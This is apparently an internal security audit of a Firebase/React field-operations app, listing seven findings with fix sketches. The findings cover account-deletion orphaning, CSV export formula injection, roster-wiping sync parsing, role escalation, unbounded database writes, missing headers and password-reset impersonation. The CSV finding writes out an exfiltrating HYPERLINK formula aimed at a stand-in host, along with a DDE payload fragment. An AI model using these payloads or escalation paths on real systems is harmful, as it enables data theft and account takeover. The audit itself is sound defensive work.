# Phase J gate #257 — XSS surface / security audit (v4)

**Date:** 2026-07-28 · **Branch:** `v4-redesign` · **Auditor:** code-auditor (findings only, no fixes)
**Scope:** `src/` (v4 app), `database.rules.json`, `src/core/schema/rules.ts`, `functions/`,
`vite.config.ts`, `firebase.json`, `.firebaserc`. The root v3 app (`index.html` / `app.js`) is
explicitly OUT of scope (retired at cutover).

## Verdict: **PASS-WITH-CONDITIONS**

The XSS surface is effectively nil (React-only rendering, zero `dangerouslySetInnerHTML`), the
rules generator is drift-free and green, and the server callables re-implement every rule guard
they bypass. Seven NEW findings; one (**J257-S1**) is a HIGH that should be closed or explicitly
accepted before cutover because it can permanently strand a department's admin governance. The
rest are MED/LOW hardening.

**Conditions to clear the gate:**
1. Fix or formally accept **J257-S1** (account deletion orphans an active — possibly Admin — member row).
2. Fix **J257-S2** (hazard ICS-208 export formula injection) — one function call.
3. File **J257-S3 … J257-S7** as tracked Phase J sub-issues; none is a cutover blocker on its own.

## Summary table

| Severity | XSS | Rules / authz | Injection | Config / supply chain | Peer-trust |
|---|---|---|---|---|---|
| CRIT | — | — | — | — | — |
| HIGH | — | **J257-S1** | — | — | — |
| MED | — | — | **J257-S2** | **J257-S5** | **J257-S3** |
| LOW | — | **J257-S4**, **J257-S7** | J257-S2b (in J257-S2) | **J257-S6** | — |

Findings are numbered `J257-S#` (gate-prefixed — `findings-ledger.md` already uses bare `S1`–`S8`
from the v3.5.1 audits, so the prefix avoids a collision when this merges into the ledger). Cross-referenced against `TRIAGE-2026-07-28.md` (#447–#480) and the closed
#415–#429 — none of the below duplicates a tracked item.

---

## J257-S1 — HIGH — Deleting your account leaves an ACTIVE member row behind; a deleted Admin permanently strands the department

**File:** `src/data/auth/accountService.ts:172-200` (`deleteAccount`)
**Call site:** `src/app/routes/settings/AccountPage.tsx:45-52, 223-258` — **no guard**. The confirm
modal asks only for the password: no last-Admin check, no department check, no cloud-cleanup step.
The copy at `:246-251` says "Your department is *not* deleted — it stays for your crew" and never
tells the user their member row and profile stay behind. The HIGH severity is therefore the
mainline path, not an edge case.
**Related:** `src/core/schema/rules.ts:302-319` (`SELF_EDIT_RANK`), `:245-262` (`ADMIN_MANAGE`);
`database.rules.json:92` (the composed `members/$uid` `.write`).

```ts
// accountService.deleteAccount
await remove(ref(rtdb, `userDepts/${user.uid}`)).catch(() => {});
await deleteUser(user);
return { ok: true };
```

**Problem.** The flow removes the reverse index and the Firebase Auth user, then wipes local Dexie
(`accountDeletion.deleteLocalAccountData`). It never removes or deactivates
`orgs/{deptId}/members/{uid}` — and the rules make it impossible to. A `remove()` sets `newData`
to null, so:

- `SELF_EDIT_RANK` fails every equality clause (`newData.child('role').val()` is null vs the stored
  role), and it also freezes `active`, so the member can't self-deactivate either.
- `ADMIN_MANAGE` requires `manageUsers`; and if the departing member is an Admin,
  `adminLosingAdmin` additionally requires `actorIsAdmin && $uid !== auth.uid` — a self-delete is
  denied even for an Admin.

**Failure scenario.** An Admin deletes their FieldShore account (Settings → Account → Delete).
Their Auth user is gone, but `orgs/{dept}/members/{uid}` survives as `role: 'admin'`, no `active:
false`, carrying `email`, `phone`, `badge`, `certifications`. Two consequences:

1. **PII retention** — a deleted account's personal profile stays readable by every department
   member indefinitely, contradicting what "Delete account" tells the user.
2. **Governance lockout** — if that was the only Admin, no remaining member can demote or
   deactivate the ghost row (`adminLosingAdmin` needs a *different* Admin actor), and no one can
   ever become Admin (`adminGainingAdmin` needs an Admin actor). The department is permanently
   stuck with a phantom Admin and no way to appoint a real one. Recovery requires console/server
   intervention.

**Fix sketch.** Prefer a server callable (`functions/`, alongside `provisionAccount`): re-auth
client-side, then have the function delete the Auth user AND the member row, refusing when the
caller is the last active Admin ("promote someone first"). A rules-only alternative is a narrow
self-delete branch on `members/$uid` (`auth.uid === $uid && !newData.exists()`), but that
re-opens the last-Admin strand unless paired with a client pre-check — the callable is the honest
place for a count. Either way, `deleteAccount` must surface a failure instead of returning
`{ ok: true }` after a silently skipped cloud cleanup.

---

## J257-S2 — MED — CSV formula injection in the hazard ICS-208 export (and, deliberately, the inventory export)

**File:** `src/ui/command/HazardLog.tsx:38-40, 69-83`

```ts
function csvCell(v: string | number): string {
  const s = String(v);
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
...
const body = sorted.map((h) => [TYPE_LABEL[h.type], h.location, ... , h.reportedBy, ...]);
```

**Problem.** This view rolls its own cell writer instead of `@core/csv`, and applies no
`formulaSafe()` guard. `h.location` is peer-authored free text (any department member with
`runFieldWork` can log a hazard through the event stream). RFC-4180 quoting does not stop a
spreadsheet evaluating a leading `=` / `+` / `-` / `@` inside a quoted field. The guard already
exists at `src/core/audit/csv.ts:18` and its round-trip objection (comment at `csv.ts:14-17`) does
**not** apply here — the ICS-208 export is an analysis/records artifact and is never re-imported.

**Failure scenario.** A member logs a hazard at location
`=HYPERLINK("https://evil.example/"&A2,"Confirm hazard")`. The IC exports ICS-208 for the
after-action packet and opens it in Excel; the formula executes / renders as a clickable exfil
link carrying adjacent cell data. Same for a `=cmd|'…'!A1` DDE payload on older Excel.

**J257-S2b (LOW, same class, deliberate tradeoff).** `src/data/inventory/excel.ts:68-88` (`rowFor` →
`toCsv`) writes `i.apparatus` and `i.apparatusId` — free text a `manageInventory` holder controls —
unprefixed. The comment at `core/audit/csv.ts:16-17` documents the reason (the inventory CSV
round-trips through our own importer, and a prefix would corrupt it). The fix that answers that
objection is a **pair**: prefix on export in `rowFor`, and strip exactly one leading `'` in
`validateRow` (`src/data/inventory/excel.ts:228-231`, in the `at()` accessor) on import, so a
round-trip is byte-stable. Report separately if the pairing isn't wanted.

**Fix sketch.** Route `HazardLog.exportIcs208` through `@core/csv serialize()` and wrap the
peer-controlled columns (`Location`, `Reported by`, `Mitigated by`) in the existing `formulaSafe`
— promote it from `core/audit/csv.ts` to a shared export in `@core/csv` so there is one guard, not
two implementations of quoting.

---

## J257-S3 — MED — One malformed cloud blob durably wipes every peer's rig roster / titles / checklists

**Files:** `src/data/store/apparatusStore.ts:52, 118-125`; same shape in
`customTitlesStore.ts:39, 88-92`, `apparatusTypesStore.ts:40, 92-96`,
`checklistTemplateStore.ts:48, 109-113`. Cloud side: `src/core/schema/rules.ts:227`
(`STATE_BLOB_VALIDATE`) / `database.rules.json:155-169`.

```ts
const Roster = z.array(Apparatus).catch([]);
...
async applyRemote(value, stamp) {
  const roster = Roster.parse(value);   // one bad element ⇒ [] (the .catch), never a throw
  await persist(roster, stamp);         // durable write, REMOTE stamp preserved
  store.setState({ roster }, true);
}
```

**Problem.** `.catch([])` is applied to the **whole array**, so a single malformed element collapses
the entire roster to empty rather than dropping the bad row (contrast `rolesStore.ts:35-43`, which
`safeParse`s per entry and skips only the offender — the correct pattern). The emptied value is
then written **durably with the remote `lastWriteAt` preserved**, so the local stamp equals the
poisoned stamp and the first-merge push-up in `stateListener.handleBlob` (`:120-128`) can never
win it back. Cloud-side there is no shape gate: `STATE_BLOB_VALIDATE` requires only a numeric
`lastWriteAt` (deliberately — see the note at `rules.ts:223-226`), so `value` is unconstrained.

**Most likely trigger is NOT an attacker — it is schema evolution.** Add a required field to
`Apparatus` (or `CustomTitle` / `ApparatusTypeCustom` / `ChecklistTemplate`), ship it, and the
first updated device pushes a blob the *old* clients cannot parse. Every not-yet-updated peer
collapses the whole roster to `[]` and persists that emptied value durably with the new client's
stamp. A perfectly normal staged rollout wipes rosters on lagging devices, self-inflicted, with no
hostile member anywhere in the picture.

**Failure scenario (adversarial variant).** A member with `manageInventory` (or a compromised
account) writes `orgs/{dept}/apparatus = { value: [{bogus:1}],
lastWriteAt: <now> }`. Every peer's apparatus roster silently becomes empty and stays empty across
reloads; inventory rows keep an `apparatusId` that resolves to nothing. Same for custom titles,
apparatus types, and checklist overrides. Not covered by #464/#465 (those are inventory-row races).

**Fix sketch.** Move the `.catch` inside the element: `z.array(Apparatus.catch(null)).catch([])`
then filter nulls — or mirror `rolesStore.parseRoles` and `safeParse` per element. Additionally,
when the parse *degrades* (parsed length < raw length, or raw wasn't an array), do not adopt the
remote stamp — keep local and log to `/diagnostics/sync` so the poisoned blob can be traced.

---

## J257-S4 — LOW — `manageUsers` is effectively omnipotent-minus-Admin-token: a custom role can be minted with all 8 permissions and self-assigned

**Files:** `src/core/schema/rules.ts:281-287` (`ROLE_MANAGE`), `:254-262` (`adminGainingAdmin`);
server mirror `functions/src/guards.ts:58-62` (`requireAdminForAdminGrant`).

**Problem.** `ROLE_MANAGE` protects only the literal `admin` **id** (`$roleId !== 'admin'`). A
`manageUsers` holder who is *not* Admin may create a custom role with all eight permissions true
(or edit the built-in `default` role the same way) and then assign it to themselves via
`ADMIN_MANAGE` — `adminGainingAdmin` doesn't fire, because the new role's id isn't `admin`. The
server callable has the same literal-token check.

**Failure scenario.** A department creates a "Duty Officer" role with `manageUsers` only. That
holder mints `role:superuser` with `manageData`/`manageSettings`/`manageInventory` all true and
self-assigns — full back-office control without an Admin ever approving it.

**Assessment.** The ≥1-Admin anti-lockout still holds (`adminLosingAdmin` protects the admin
token, so admins can't be demoted or deactivated by the escalated role). Under ADR-017 "Manage
users & roles" is one permission key and role authoring is the point of it, so this may be
intended. Report as **documentation-or-gate**, not a defect: either state in ADR-017 that
`manageUsers` implies the full permission taxonomy, or add a rule clause requiring the actor to
be Admin when a role grants a permission the actor's own role lacks.

---

## J257-S5 — MED — Unbounded, un-shaped, auth-only writes to `/feedback` and `/diagnostics/sync` on a Blaze project

**Files:** `database.rules.json:7-22`; writers `src/data/feedback/feedbackService.ts:38-46`,
`src/data/sync/diagnostics.ts:15`.

```json
"$feedbackId": { ".write": "auth != null && !data.exists()",
  ".validate": "... newData.child('text').val().length <= 5000 ..." }
"sync": { "$logId": { ".write": "auth != null && !data.exists()",
  ".validate": "newData.hasChild('ts') && newData.hasChild('event')" } }
```

**Problem.** Both nodes are gated on `auth != null` only — **any** signed-in account, from any
department or none, may write. Neither carries `$other: { ".validate": false }` nor a per-field
size cap beyond `feedback.text`. `/diagnostics/sync` requires only that `ts` and `event` exist,
with no type or length constraint at all. The project is on **Blaze** (metered) since #439.

**Failure scenario.** A hostile or scripted account pushes multi-megabyte payloads under arbitrary
extra keys (write-once per key, but keys are unbounded) into `/diagnostics/sync/*` — RTDB storage
and egress bill the department's project, and the diagnostics tree becomes unusable for the sync
triage it exists for. No app-side read path even exists for `/feedback` (`.read: false`), so
nothing surfaces the growth.

**Fix sketch.** Add `$other: { ".validate": false }` plus explicit per-field validators to both
nodes (mirror the shape the writers actually send: `category/text/timestamp/deptId/deptName/
appVersion/uid`; `ts/event/…` with string caps for diagnostics). Cap total children by writing
diagnostics under a per-uid subtree (`diagnostics/sync/$uid/$logId` with `auth.uid == $uid`) so
abuse is attributable and can be revoked. Consider a Cloud Function TTL prune.

---

## J257-S6 — LOW — No security response headers on Firebase Hosting; `.firebaserc` project pin is gitignored

**Files:** `firebase.json:20-32` (hosting `headers`), `.firebaserc`, `.gitignore:~20`.

**Problem (headers).** Hosting sets only `Cache-Control`. There is no `Content-Security-Policy`, no
`X-Content-Type-Options: nosniff`, no `Referrer-Policy`, no `Permissions-Policy`. The app renders
peer-authored text everywhere and completes email magic links in-page; a CSP is the defense-in-
depth that would blunt any future rendering escape hatch, and `nosniff` costs nothing.

**Fix sketch.** Add a `**` header block: `X-Content-Type-Options: nosniff`, `Referrer-Policy:
strict-origin-when-cross-origin` (**not** `no-referrer` — the Google Maps browser key's only
defense is the HTTP-referrer restriction documented in `.env.example`), `Permissions-Policy:
geolocation=(self), camera=(), microphone=()`. Introduce CSP in report-only first: it must allow
`https://*.googleapis.com`, `https://*.firebaseio.com`, `wss:`, `https://api.what3words.com`, and
`'unsafe-inline'` for the two pre-paint inline scripts in `src/app/index.html:11-38` (or give them
hashes).

**Problem (`.firebaserc`).** The file pins `default: fieldshore-database` (correct — v4's own
project, not v3's `paratech-c3ab4`) but is **gitignored**, so the pin is not version-controlled and
a fresh clone has no project binding. Given the documented history of a hosting deploy landing on
the live site instead of the `beta` preview channel, an unpinned project/target is an operational
hazard. **Fix sketch:** commit `.firebaserc` (it contains no secrets) and add a hosting `target`
so `firebase hosting:channel:deploy beta` is the only sanctioned path; keep `.firebase/` ignored.

---

## J257-S7 — LOW — `manageUsers` can reset any non-Admin member's password and sign in as them, crossing the ADR-017 orthogonality claim

**File:** `functions/src/index.ts:160-203` (`adminUpdateAccount`), `functions/src/guards.ts:70-85`
(`requireAccountTarget`).

**Problem.** `adminUpdateAccount` accepts a caller-chosen `newPassword` for any target in the
department. `requireAccountTarget` shields only Admins (`target.role === ADMIN_ROLE_ID`), so a
non-Admin `manageUsers` holder may set any **non-Admin** member's password to a value they know,
then sign in as that member. In isolation this is a standard admin-console capability (the real
User Manager flow is "reset to a starter password and hand it over"), and `mustChangePassword` is
re-raised — but nothing *prevents* the holder from using the credential first.

**Why it matters here.** ADR-017 asserts the back-office RBAC axis and the fireground ICS-position
axis are **orthogonal** — "back-office only; the fireground stays ICS-position-gated". Since
positions now follow the *account* (device→account binding, 2026-07-11), the ability to assume a
member's login is the ability to assume their ICS position, up to and including Incident Commander
if the IC is not also an Admin. The two axes are therefore not orthogonal for a `manageUsers`
holder.

**Fix sketch.** Either (a) narrow the doctrine: state in ADR-017 that `manageUsers` is trusted with
account custody and is therefore *not* orthogonal to the fireground axis, or (b) make the reset
non-assumable — have the server mint a one-time reset **link** (`generatePasswordResetLink`) mailed
to the member rather than returning a password the admin knows. (b) also removes the
client-derived `${lastname}123!` starter password from the trust model.

---

## Verified clean

**XSS (task item 1).** Zero occurrences of `dangerouslySetInnerHTML`, `outerHTML`,
`insertAdjacentHTML`, `document.write`, `eval`, or `new Function` anywhere under `src/`. The single
`innerHTML` hit is `src/ui/primitives/overlay.test.ts:51` (test teardown). All rendering is React
text nodes. `href` construction is static or same-origin only (`SettingsRows.tsx:121` carries
`rel="noopener noreferrer"` with a caller-supplied constant; `HelpReferencePage.tsx:70,76` are
literals; `download.ts:5` builds a Blob object URL from app-generated text, `welcome.html` links
are literals). No user data reaches a URL, an attribute, or a `javascript:` sink. The v3
`escapeHtml`/`escapeAttr` rules correctly do not apply here.

**Rules ↔ code drift (task item 2).** `npx vitest run src/core/schema/rules.test.ts` → **17/17
green** (exit 0): the committed `database.rules.json` matches `buildV4OrgsRules()` exactly, and the
legacy-tree lockdown assertions hold. Every client write path traced to a matching rule:
`orgs/{d}/members/{uid}` (join/self-edit/admin-manage), `roles/{id}`, `events/{op}/{id}`,
`inventory/{id}`, `apparatus|titles|checklists|apparatusTypes|deptPolicies`, `audit/{id}`,
`deviceOwners/{uid}`, `orgs/inviteCodes/{code}`, `userDepts/{uid}`, `/feedback`,
`/diagnostics/sync` — with the sole exception of the *missing* member-row delete in J257-S1.
`peerCuts.ts` is a pure in-memory counter with no cloud path. No over-permissive `.read`:
`departments` and the `$other` catch-all are deny-all; `config` is read-only-public by design;
`orgs/inviteCodes` has no parent `.read` (no enumeration) and per-code read requires knowing the
code, which is 8 chars over a 32-symbol alphabet (~2^40) minted from `crypto.getRandomValues`
(`departmentService.ts:36-47`) — not brute-forceable over RTDB.

**Anti-lockout + ADMIN_MANAGE (task item 2).** The count-free ≥1-Admin guarantee is sound as
written: `adminLosingAdmin` covers demote, delete, AND deactivate, and requires a *different*
Admin actor; `adminGainingAdmin` blocks non-Admin self-promotion to the admin token (the #57b7689
fix is present and pinned by `rules.test.ts`). The only way to strand a department is J257-S1.

**Invite-code lifecycle (task item 2).** The #423 revoke branch is present and correct — the only
permitted update flips `active → false` with every other field frozen; no branch permits delete or
reactivation; create requires founder-or-`manageUsers` on the named dept. Verified against
`departmentService.ts:798, 811-840`.

**Server callables (task item 2).** `functions/src/guards.ts` re-checks everything the Admin SDK
bypasses: authenticated, active member, data-driven `manageUsers` lookup, `requireAdminForAdminGrant`
(admin can only be minted by an Admin), `requireAccountTarget` (target must be in the same dept;
touching an Admin's account requires an Admin caller and forbids self-targeting through the
privileged path). Profile length caps are re-stated server-side (`index.ts:38-59`) because
`.validate` doesn't run. RTDB failure rolls the Auth user back. Password/email changes revoke
refresh tokens. No unauthenticated entry point.

**Zod at sync boundaries (task item 3).** Event ingress is `FieldShoreEvent.safeParse`-gated on
every path (`operationStore.ts:130, 140, 303`) — a malformed peer event is dropped, not applied.
Inventory rows are `InventoryItem.safeParse`d in `applyRemoteRow` (`inventoryStore.ts:319`). Roles
are per-entry `safeParse`d with bad entries skipped (`rolesStore.ts:35-43`). Session/onboarding
persisted rows are `safeParse`-then-degrade. Blob ingress is `.catch()`-guarded so no parse
throws — but see **J257-S3** for the all-or-nothing granularity.

**CSV import (task item 3).** `excel.parseRecords` is a correct char-by-char RFC-4180 parser;
unterminated quotes reject the whole file loudly rather than silently truncating. `parsePosInt`
refuses `0x`/`1e`/`+` forms. Type/Model/System/Plate ID all resolve against pinned catalogs.
`personnelCsv` caps every field to the `Member` schema's limits, flags in-file duplicate emails,
and pre-flags the Admin-grant escalation the server would reject. The audit-log CSV export applies
`formulaSafe()` to all four peer-controlled columns (#57b7689 fix intact).

**Secrets / config (task item 4).** No hardcoded secrets. The Firebase web config
(`src/data/auth/firebase.ts:9`) is public-by-design and excluded per scope. Google Maps and
what3words keys come from `VITE_*` env with an empty-key graceful-off path; `.env.local` is
gitignored, `.env.example` documents referrer + API restriction for the Maps key and domain
restriction for w3w. `w3w.ts` `encodeURIComponent`s both the coordinates and the key.

**Supply chain / SW (task item 5).** No CDN `<script>` tags, no dynamic remote script loading, no
SRI surface (everything is bundled by Vite; the Google Maps SDK is loaded through the official
loader, not a hand-rolled tag). The v3 `sw.js` is not used — `vite-plugin-pwa` (Workbox) owns the
service worker with the one invariant preserved: `firebaseio.com` + `wss:` are `NetworkOnly`,
never cached (`vite.config.ts:69-75`). Scope is the hosting root, correct for a single-origin PWA.
Dev-server `allowedHosts: ['.local']` is a safe DNS-rebinding posture.

**Closed-fix regression spot-check.** #418 (`ROLE_MANAGE` on `roles/$roleId`) present at
`database.rules.json:137`. #423 (invite revoke) present at `:210`. #424 (legacy tree lockdown)
present: `/departments` deny-all at `:3-6`, `/feedback` + `/diagnostics` write-once with
`.read: false`, `$other` deny-all at `:214-217`. #425–#429 are UI/behavior fixes outside this
gate's rule surface; no rules-side regression observed.
